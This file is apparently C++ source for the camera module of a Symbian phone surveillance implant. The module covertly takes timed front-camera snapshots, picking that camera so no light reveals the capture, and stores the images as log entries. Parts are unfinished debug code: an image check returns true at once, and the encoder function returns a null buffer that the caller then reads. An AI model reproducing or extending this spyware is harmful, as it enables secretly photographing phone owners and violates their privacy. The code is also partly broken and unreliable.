/*
 * AgentCamera.cpp
 *
 *  Created on: 09/giu/2011
 *      Author: Giovanna
 */

#include "AgentCamera.h"
#include "LogFile.h"

#include <ICL\ImageData.h>
#include <ICL\ImageCodecData.h>

const TInt KMin = 0;
const TInt KMax = 255;
const TInt KLowThreshold = 20;
const TInt KHighThreshold = (255 - KLowThreshold);
const TInt KThStep = 25;

CAgentCamera::CAgentCamera() :
	CAbstractAgent(EAgent_Cam),iEngineState(EEngineNotReady)
	{
	// No implementation required
	}

CAgentCamera::~CAgentCamera()
	{
	delete iTimer;
	if(iEngineState!=EEngineNotReady)
		{
		iCamera->PowerOff();
		iCamera->Release();
		}
	delete iCamera;
	delete iEncoder;
	delete iBitmapSave;
	}

CAgentCamera* CAgentCamera::NewLC(const TDesC8& params)
	{
	CAgentCamera* self = new (ELeave) CAgentCamera();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentCamera* CAgentCamera::NewL(const TDesC8& params)
	{
	CAgentCamera* self = CAgentCamera::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentCamera::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	TUint32 interval=0;               // time interval, in milliseconds, among two snapshots
	Mem::Copy( &interval, ptr, 4);
	ptr += 4;
	if(interval < 1000)
		{
		interval = 1000;
		}
	iSecondsInterv = (interval / 1000);		//time interval in seconds
		
	Mem::Copy(&iNumStep,ptr,4 );		// number of snapshots to take
	
	iTimer = CTimeOutTimer::NewL(*this);
	
	// we are only interested in front camera:
	// unfortunately, we can't set rear camera light off during shooting... so we can't use rear camera
	iNumCamera = CCamera::CamerasAvailable();  //retrieve the number of available cameras (front and/or rear)
	if(iNumCamera < 2)
		{
		//there's no front camera
		iCameraIndex = -1;
		return;
		}
	iCameraIndex = 1;  //0=rear camera,1=front camera
	TRAPD(err,iCamera = CCamera::NewL(*this, iCameraIndex));
	if(err != KErrNone)  //KErrNoMemory, KErrNotSupported, KErrPermissionDenied
		{
		iCameraIndex = -1;
		return;
		}
	//check if we can silently take snapshots
	iCamera->CameraInfo(iInfo);
	if(!(iInfo.iOptionsSupported & TCameraInfo::EImageCaptureSupported))
		{
		delete iCamera;
		iCamera=NULL;
		iCameraIndex=-1;
		return;
		}
	//retrieve supported image format		
	iFormat = ImageFormatMax();  //TODO: restore when done
	//iFormat = CCamera::EFormatFbsBitmapColor4K; //TODO: delete when done
	iBitmapSave = new (ELeave) CFbsBitmap;
	}

void CAgentCamera::StartAgentCmdL()
	{
	// if there's no front camera on device, or if it can't capture images, or some error condition arised
	if(iCameraIndex == -1)
		return;
	
	// set timer
	TTime time;
	time.HomeTime();
	time += iSecondsInterv;
	iTimer->RcsAt(time);
	
	iPerformedStep=0;
	//prepare camera if another snapshot is not ongoing
	if(iEngineState==EEngineNotReady)
		{
		++iPerformedStep;
		iEngineState = EEngineReserving;
		iCamera->Reserve();  //at completion ReserveComplete() is called.
		}	
	}

void CAgentCamera::StopAgentCmdL()
	{
	iTimer->Cancel();
	if(iEngineState!=EEngineNotReady)
		{
		iCamera->PowerOff();
		iCamera->Release();
		iEngineState = EEngineNotReady;
		}
	}



void CAgentCamera::TimerExpiredL(TAny* src)
	{
	++iPerformedStep;
	if(iPerformedStep < iNumStep)
		{
		// set timer again
		TTime time;
		time.HomeTime();
		time += iSecondsInterv;
		iTimer->RcsAt(time);
		}
	//prepare camera if another snapshot is not ongoing
	if(iEngineState==EEngineNotReady)
		{
		iEngineState = EEngineReserving;
		iCamera->Reserve();  //calls ReserveComplete() when complete
		}
	}

void CAgentCamera::ReserveComplete(TInt aError)
	{
	if(aError != KErrNone)
		{
		//we couldn't reserve camera, there's nothing more we can do
		iEngineState = EEngineNotReady;
		}
	else
		{
		// power on camera
		iEngineState = EEnginePowering;
		iCamera->PowerOn(); // calls PowerOnComplete when complete
		}
	}

void CAgentCamera::PowerOnComplete(TInt aError)
	{
	if(aError != KErrNone)
		{
		// Power on failed, release camera
		iCamera->Release();
		iEngineState = EEngineNotReady;
		}
	else
		{
		TRAPD(err,iCamera->PrepareImageCaptureL(iFormat,0)); //here, we simply select largest size (index 0)
		if(err)
			{
			iCamera->PowerOff();
			iCamera->Release();
			iEngineState = EEngineNotReady;
			}
		else
			{
			//TRAPD(err,iCamera->SetFlashL(CCamera::EFlashNone));
			iEngineState = ESnappingPicture;
			iCamera->CaptureImage(); // calls ImageReady() when complete
			}
		}
	}

void CAgentCamera::ViewFinderFrameReady(CFbsBitmap &aFrame)
	{
	// no implementation required
	}

void CAgentCamera::ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError)
	{
	//save log
	if(aError == KErrNone)
		{
		iBitmapSave->Reset();
		TInt err = iBitmapSave->Duplicate( aBitmap->Handle() );
		if(err != KErrNone)
			{
			iCamera->PowerOff();
			iCamera->Release();
			iEngineState = EEngineNotReady;
			}
		if(IsValidImage(iBitmapSave))
			{
			HBufC8* jpegImage = GetImageBufferL(iBitmapSave);
			if (jpegImage->Length() > 0)
				{
				CleanupStack::PushL(jpegImage);
							
				TInt value;
				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
									
				if(value)
					{
					CLogFile* logFile = CLogFile::NewLC(iFs);
					logFile->CreateLogL(LOGTYPE_CAMERA);
					logFile->AppendLogL(*jpegImage);
					logFile->CloseLogL();
					CleanupStack::PopAndDestroy(logFile);
					}

				CleanupStack::PopAndDestroy(jpegImage);
				}
			}
		}
	
	//release camera
	iCamera->PowerOff();
	iCamera->Release();
	iEngineState = EEngineNotReady;
	}

/* 
 * Called asynchronously, when a buffer has been filled with the required number of video frames 
 * by CCamera::StartVideoCapture().
 */
void CAgentCamera::FrameBufferReady(MFrameBuffer *aFrameBuffer, TInt aError)
	{
	// not implementated; we only take still images.
	}

/*
 * Returns the highest color mode supported by HW
 */
CCamera::TFormat CAgentCamera::ImageFormatMax() 
    {
    if ( iInfo.iImageFormatsSupported & CCamera::EFormatFbsBitmapColor16M )
        {
        return CCamera::EFormatFbsBitmapColor16M;
        }
    else if ( iInfo.iImageFormatsSupported & CCamera::EFormatFbsBitmapColor64K)
        {
        return CCamera::EFormatFbsBitmapColor64K;
        }
    else
        {
        return CCamera::EFormatFbsBitmapColor4K;
        }
    }

/*
 * Returns a buffer with encoded jpeg image
 */
HBufC8* CAgentCamera::GetImageBufferL(CFbsBitmap* aBitmap)
	{
		if (aBitmap == NULL)
			return HBufC8::NewL(0); 

		// set jpeg properties
		/*
		CFrameImageData* frameImageData = CFrameImageData::NewL();
		CleanupStack::PushL(frameImageData);
		TJpegImageData* imageData = new (ELeave) TJpegImageData();
		imageData->iSampleScheme  = TJpegImageData::EColor444;
		imageData->iQualityFactor = 75; // 80 low, set 90 for normal or 100 for high 
		frameImageData->AppendImageData(imageData);
		*/		
		// convert to jpeg synchronously
		
		HBufC8* imageBuf = NULL;
		/*
		CImageEncoder* encoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
		CleanupStack::PushL(encoder);
		TRequestStatus aStatus = KErrNone; 
		encoder->Convert( &aStatus, *aBitmap, frameImageData );
		//encoder->Convert( &aStatus, *aBitmap);
		User::WaitForRequest( aStatus );
		CleanupStack::PopAndDestroy(encoder);
		*/
		CImageEncoder* encoder = CImageEncoder::FileNewL(iFs, _L("C:\\provasnapshot.bmp"),_L8("image/bmp"),CImageEncoder::EOptionAlwaysThread);
		CleanupStack::PushL(encoder);
		TRequestStatus aStatus = KErrNone; 
		encoder->Convert( &aStatus, *aBitmap);
		User::WaitForRequest( aStatus );
		CleanupStack::PopAndDestroy(encoder);
		
		//CleanupStack::PopAndDestroy(frameImageData);
		return imageBuf;
	}

TBool CAgentCamera::IsValidImage(CFbsBitmap* aImage)
	{
	
	return ETrue; //TODO: delete when done debugging
	
	TSize imageSize = aImage->SizeInPixels();
	TInt height = imageSize.iHeight;  //the number of lines
	TInt width = imageSize.iWidth;    //the number of pixels per line
	TPoint pixel(TPoint::EUninitialized);
	TRgb rgbColor;
	TInt r,g,b;
	TReal gray;
	TReal min = 0;
	TReal max = 0;
	TReal thmin = KMin;
	TReal thmax = KMax;
	TReal avgSum = 0, tmpAvg = 0;
	TInt pixelCount = 0;

	//initialize
	pixel.SetXY(0,0);
	aImage->GetPixel(rgbColor,pixel);
	min = (0.1140 * rgbColor.Blue()) + (0.5870 * rgbColor.Green()) + (0.2989 * rgbColor.Red());
	max = min;
	//cycle
	for(TInt i=0; i<height; i++)   
		{
		//for every line take the pixel
		for (TInt j=0; j<width; j++)
			{
			pixel.SetXY(i,j);
			aImage->GetPixel(rgbColor,pixel);
			r = rgbColor.Red();
			g = rgbColor.Green();
			b = rgbColor.Blue();
			gray = (0.1140 * b) + (0.5870 * g) + (0.2989 * r);
			if (gray < min)
				min = gray;
			if (gray > max)
			    max = gray;
			avgSum += gray;
			pixelCount++;
			}
		}
	if(pixelCount == 0)
		return EFalse;
	tmpAvg = avgSum / pixelCount;
	if ((tmpAvg > KLowThreshold) && (tmpAvg < KHighThreshold)) 
		{
	    (tmpAvg > (KMin + KThStep)) ? thmin = (tmpAvg - KThStep): thmin = KMin;
	    (tmpAvg < (KMax - KThStep)) ? thmax = (tmpAvg + KThStep): thmax = KMax;
	    if ((min < thmin) && (max > thmax) )//i valori min e max della luminosita' sono sufficentemente lontani dalla media
	    	{
	    	return ETrue;
	        } 
	    else 
	    	{
	        return EFalse;
	        }
	    }
	return EFalse;
	}

    
